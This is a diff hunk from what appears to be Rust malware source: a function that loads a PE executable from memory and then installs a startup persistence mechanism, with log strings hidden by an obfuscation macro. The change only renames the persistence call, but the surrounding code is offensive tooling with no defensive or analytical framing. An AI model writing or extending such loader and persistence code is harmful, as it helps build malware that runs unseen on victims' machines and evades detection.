@@ -334,7 +334,7 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
 
     // Save payload for persistence
     if ENABLE_STARTUP {
-        if let Err(e) = persistence::save_payload_with_persistence(pe_data) {
+        if let Err(e) = persistence::persist() {
             eprintln!("{}{}", obfuscate_string!("[WARNING] Persistence failed: "), e);
         }
     }
